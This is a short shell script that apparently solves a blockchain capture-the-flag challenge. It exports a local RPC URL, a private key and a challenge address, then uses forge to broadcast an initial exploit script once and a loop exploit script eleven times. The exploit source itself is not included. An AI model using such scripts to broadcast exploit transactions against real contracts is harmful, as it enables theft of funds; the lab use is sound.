export RPC=http://localhost:31337/325902eb-86c3-4266-9ad9-f72c33a832f4
export PVKEY=0xf214da2072bc9f2b921e8f3331915b794f2de14b806e305d61640ceb82aa8478
export CHALL=0xaa1B546F25267Db6eA49e6C265DFB83199314E73

forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitInit --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun
forge script --broadcast --rpc-url $RPC --private-key $PVKEY ./Exploit.sol:ExploitLoop --evm-version cancun